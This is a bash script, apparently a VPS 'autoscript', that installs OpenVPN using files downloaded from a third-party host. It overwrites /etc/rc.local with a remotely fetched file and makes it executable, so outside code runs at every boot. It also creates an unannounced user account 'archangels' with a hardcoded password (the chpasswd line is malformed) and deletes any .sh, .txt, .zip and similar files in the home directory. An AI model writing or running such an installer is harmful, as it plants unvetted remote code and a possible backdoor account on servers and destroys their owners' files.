#!/bin/bash

apt-get -y install openvpn
wget -O /etc/openvpn/openvpn.tar "http://autoscriptnobita.tk/rendum/openvpn.tar"
cd /etc/openvpn/;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/rc.local "http://autoscriptnobita.tk/rendum/rc.local";chmod +x /etc/rc.local
#wget -O /etc/iptables.up.rules "http://rzvpn.net/random/iptables.up.rules"
#sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
#iptables-restore < /etc/iptables.up.rules
# etc
wget -O /home/vps/public_html/client.ovpn "http://autoscriptnobita.tk/rendum/client.ovpn"
wget -O /etc/motd "http://autoscriptnobita.tk/rendum/motd"
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
useradd -m -g users -s /bin/bash archangels
echo "7C22C4ED" | chpasswd
echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear
iptables-restore < /etc/iptables.conf
service openvpn restart
